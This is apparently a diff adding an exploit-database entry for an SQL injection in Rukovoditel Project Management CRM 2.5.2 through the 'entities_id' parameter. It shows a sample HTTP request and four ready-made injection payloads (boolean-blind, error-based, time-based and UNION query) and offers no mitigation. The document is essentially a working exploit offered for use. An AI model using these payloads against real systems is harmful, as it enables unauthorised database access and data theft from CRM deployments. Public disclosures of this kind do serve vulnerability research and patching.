@@ -1,0 +1,48 @@
+# Exploit Title: Rukovoditel Project Management CRM 2.5.2 - 'entities_id' SQL Injection
+# Google Dork: N/A
+# Date: 2020-01-15
+# Blog: https://fatihhcelik.blogspot.com/
+# Exploit Author: Fatih Çelik
+# Vendor Homepage: https://www.rukovoditel.net/
+# Software Link: https://sourceforge.net/projects/rukovoditel/
+# Version: 2.5.2
+# Tested on: Kali Linux
+# CVE : N/A
+
+ 
+
+# Request,
+GET /ruko/index.php?module=entities/fields&entities_id=25 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/ruko/index.php?module=entities/fields&entities_id=25
+Connection: close
+Cookie: cookie_test=please_accept_for_session; sid=3jnq6vg6ovl2cq0ojpsff4vaol; hblid=9P5zBGVwXwPEgj9L3m39N0U0I0A6O221; olfsk=olfsk14190220759411198; xoadmstyle=silver
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+# PAYLOADS,
+
+# Parameter: entities_id (GET)
+# Type: boolean-based blind
+# Title: AND boolean-based blind - WHERE or HAVING clause
+
+Payload: module=entities/fields&entities_id=25' AND 2091=2091 AND 'emRY'='emRY
+
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+
+Payload: module=entities/fields&entities_id=25' AND (SELECT 2023 FROM(SELECT COUNT(*),CONCAT(0x716b706a71,(SELECT (ELT(2023=2023,1))),0x7162787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ZZpM'='ZZpM
+
+# Type: time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+Payload: module=entities/fields&entities_id=25' AND (SELECT 5681 FROM (SELECT(SLEEP(5)))rdOz) AND 'vWza'='vWza
+
+# Type: UNION query
+# Title: Generic UNION query (NULL) - 23 columns
+
+Payload: module=entities/fields&entities_id=25' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b706a71,0x5a664143527068525459496254624c514e45694d42776a6d67614a68434c6762434f62514d4f4566,0x7162787871),NULL-- syQw
